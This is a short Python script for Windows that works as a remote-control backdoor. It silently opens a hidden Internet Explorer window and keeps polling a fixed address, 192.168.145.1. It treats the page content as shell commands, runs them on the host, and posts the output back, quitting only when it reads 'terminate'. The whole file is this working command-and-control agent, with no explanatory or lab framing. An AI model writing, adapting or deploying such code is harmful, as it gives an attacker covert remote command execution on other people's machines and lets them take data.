from win32com.client import Dispatch
import time
import subprocess

ie = Dispatch('InternetExplorer.Application')
ie.visible=False

while True:
    ie.Navigate('http://192.168.145.1')

    while ie.ReadyState!=4:
        time.sleep(2)

    cmd = ie.Document.body.innerHTML
    cmd = cmd.encode('ascii','ignore')

    if 'terminate' in cmd:
        ie.Quit()
        break

    else:
        cmd = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        s1 = cmd.stdout.read()
        s2 = cmd.stderr.read()
        ie.Navigate('http://192.168.145.1',0,'',buffer(s1+s2))

    time.sleep(2)




